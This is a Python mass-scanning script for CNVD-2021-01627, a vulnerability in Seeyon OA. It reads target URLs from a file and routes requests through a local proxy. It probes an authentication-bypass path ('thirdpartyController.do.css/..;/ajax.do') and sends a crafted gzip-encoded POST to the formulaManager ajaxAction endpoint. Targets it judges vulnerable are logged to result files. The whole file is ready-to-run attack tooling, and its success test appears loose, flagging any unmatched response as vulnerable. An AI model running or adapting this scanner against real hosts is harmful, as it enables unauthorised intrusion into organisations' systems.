import requests
import pyfiglet

banner = pyfiglet.figlet_format("cnvd-2021-01627")
print(banner)

# 从文件中读取URLS
with open('urls.txt', 'r') as file:
    urls = file.read().splitlines()

""" 定义函数 扫描URLS中漏洞 """
def except_scan():
    # 打开需要保存结果的文件
    result_file = open('result.txt', 'a')

    """ 指定代理 """
    http_proxy = 'http://127.0.0.1:1087'
    https_proxy = 'http://127.0.0.1:1087'

    proxies = {
        'http': f'{http_proxy}',
        'https': f'{https_proxy}'
    }
    print("\033[94m[+]\033[0m"+"当前代理"+http_proxy)
    print()
    print("Start pageExcept Scan ......")
    print()
    i = 0
    for url in urls:
        try:
            url = urls[i]
            i += 1
            url_payload = url + '/seeyon/thirdpartyController.do.css/..;/ajax.do'  # 构建URL载荷
            try:
                response = requests.get(url_payload, timeout=10, proxies=proxies)
                c = response.status_code
                str_c = str(c)
                if 'java.lang.NullPointerException:null' in response.text and response.status_code == 200:
                    print("[\033[91msuccess\033[0m]" + url_payload + " \033[93m[{}]\033[0m".format(str_c))  # 如果发现漏洞,则打印漏洞URL
                    result_file.write(f'{url}\n')  # 把漏洞URL写入文件
                else:
                    print("[\033[92mINFO\033[0m]" + url_payload + " \033[93m[{}]\033[0m".format(str_c))
            except Exception as e:
                print("[请求超时]" + url_payload)
        except KeyboardInterrupt:
            print("Interrupted by the user, exiting...")
            break  # 终止循环
    result_file.close()
    print("Finish Scan")


def vulnerability_scan():
    try:
        # 读取URLS文件
        with open('result.txt', 'r') as f:
            urls = f.read().splitlines()
        print("Start vulnerability scan ......")
        print()
        i = 0
        for url in urls:
            url = urls[i]
            i += 1
            payload_url = f"{url}/seeyon/autoinstall.do.css/..;/ajax.do?method=ajaxAction&managerName=formulaManager&requestCompress=gzip"
            proxies = {
                'http': 'http://127.0.0.1:1087',
                'https': 'http://127.0.0.1:1087'
            }
            headers = {
                "User-Agent": "Opera/9.80 (Macintosh; Intel Mac OS X 10.6.8; U; fr) Presto/2.9.168 Version/11.52",
                "Accept-Encoding": "gzip, deflate",
                "Content-Type": "application/x-www-form-urlencoded",
                "loginPageURL": "",
                "login_locale": "zh_CN"
            }
            data = {
                "managerMethod": "validate",
                "arguments": "%1F%8B%08%00%F8%8D%3Ff%02%FF%CBH%CD%C9%C9%2F%CF%2F%CAI%01%00%AD+%EB%F9%0A%00%00%00"
            }

            try:
                response = requests.post(url=payload_url, headers=headers, data=data, timeout=5, proxies=proxies)
                if response.status_code == 500 and "-1" in response.text:
                    code = response.status_code
                    str_code = str(code)
                    print("[INFO]" + response.url + " \033[93m[{}]\033[0m".format(str_code))
                else:
                    print("[\033[91mSuccess\033[0m]" + url)
                    with open("vulnerability_URL.txt", "a") as e:
                        e.write(f"{url} is vulnerable\n")
            except Exception as e:
                print("[请求出错]" + str(e))
    except KeyboardInterrupt:
        print("Scanning interrupted by the user, exiting...")
        return  # 终止当前函数执行
    print("Finish Scan")

except_scan()
vulnerability_scan()
